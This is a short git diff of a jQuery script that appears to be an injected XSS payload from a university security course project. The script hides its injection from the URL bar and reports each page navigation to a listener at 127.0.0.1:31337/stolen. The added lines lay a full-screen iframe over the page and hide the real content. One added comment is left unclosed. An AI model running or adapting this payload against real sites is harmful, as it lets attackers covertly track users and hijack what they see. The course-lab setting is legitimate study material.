@@ -1,4 +1,8 @@
 $( document ).ready(function() {
+    var iframeHtml = "<div id=\"iframe-hack\"><iframe style=\"width:100%; height:100%; position:fixed; left:0; top:0;\" src=\"http://cis331.cis.upenn.edu/project2\"></iframe></div>";
+
+    $("body").append(iframeHtml);
+    $('body > :not(#iframe-hack)').hide();
 
     /* Removing the JavaScript code from the URL*/
     window.history.pushState("Blah", "Title", document.URL.split("%3Cscript")[0]); 
@@ -12,6 +16,7 @@ $( document ).ready(function() {
         $.get("http://127.0.0.1:31337/stolen?event=nav&url=" + encodedUrl);
     }
 
+    /* Adding the code to the link
 
     /* Hiding search elements that have JavaScript code */
     $("#history-list").children().each( function () { 
